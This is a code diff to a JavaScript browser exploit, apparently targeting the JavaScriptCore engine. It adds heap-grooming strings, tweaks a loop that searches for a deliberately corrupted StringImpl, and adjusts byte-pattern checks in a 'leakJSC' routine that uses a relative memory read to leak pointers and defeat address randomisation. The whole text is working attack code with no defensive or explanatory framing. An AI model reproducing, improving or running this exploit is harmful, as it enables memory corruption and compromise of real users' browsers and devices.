@@ -36,6 +36,9 @@ var g_message_body_leak = null;
 
 var g_obj_str = {};
 
+var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
+var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
+
 var g_round = 1;
 var g_input = null;
 
@@ -191,7 +194,7 @@ function leakJSC() {
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
-	for (let i = arr_str.length - 2; i > 0; i--) {
+	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
@@ -261,9 +264,9 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
 					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x13) === 0x42)
+					g_relative_read.charCodeAt(i + 0x13) === 0x42 &&
+					g_relative_read.charCodeAt(i + 0x14) === 0x42)
 					v = new Int64(str2array(g_relative_read, 8, i + 8));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
